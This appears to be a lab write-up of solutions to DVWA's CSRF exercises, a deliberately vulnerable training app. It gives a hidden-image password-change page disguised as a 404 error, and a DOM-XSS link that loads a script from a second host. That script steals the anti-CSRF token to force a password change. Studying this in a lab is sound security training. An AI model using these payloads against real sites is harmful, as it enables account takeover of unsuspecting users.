# DVWA - CSRF Solution

## Low level
### Solution
> We can write a html page to let the user to browse and the web will show 404, but we can change the password by the img url.

```htmlembedded=
<img src="http://192.168.1.66/DVWA-master/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#" border="0" style="display:none;"/>

<h1>404 ERROR !<h1>

<h2>Files Not Found.<h2>
```
### Error on Chrome
> The Chrome can't access the cookie through different domain. Because the feature of Chrome(https://www.chromestatus.com/feature/5629709824032768), we can't access the cookie of the different domain. 
> 
> ![](https://i.imgur.com/m2yyvC2.png)

> So, we need to establish the web server in the same domain or use the other bowser.
> 
> ![](https://i.imgur.com/MvcDAky.png)


## Medium level
> In this case it will check the HOST_REFERENCE and HOST_HOST, so we can not use the file to be clicked. We need to let the attacked ise the web server to access the html file.
> So I establish the web server on another VM. And we need to rename the HTML file be the host IP. Then we can change the attacked's password. 
> 
> ![](https://i.imgur.com/DfNqBkP.png)

## High level of CSRF
> In this case, the web site add the Auti-CRSF token, so we need to get the user-token to change his/her password.
> Use the XSS weakness to get the user token and send the request to change the password.
> 
> Use the "http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=English#<script src="http://192.168.1.68/xss.js"></script>" to le attacked to click.
> 
> XSS.js (put it into the web server)
```javascript=1
// alert(document.cookie);

var theUrl = 'http://192.168.1.68/DVWA-master/vulnerabilities/csrf/';

if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

var count = 0;
xmlhttp.withCredentials = true;

xmlhttp.onreadystatechange = function(){
    if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        // console.log(match);
        // alert(match[1]);
        var token = match[1];
        var new_url = 'http://192.168.1.66/DVWA-master/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=' + token + '#';
        if(count == 0){
            count++;
            xmlhttp.open("GET", new_url, false);
            xmlhttp.send();
        }
    }
};

xmlhttp.open("GET", theUrl, false);
xmlhttp.send();
```


## Impossible level of CRSF
> In this case, web site add the PDO to protect the sql injection. And it request the ttacked's password we can't to attack the password.
> 
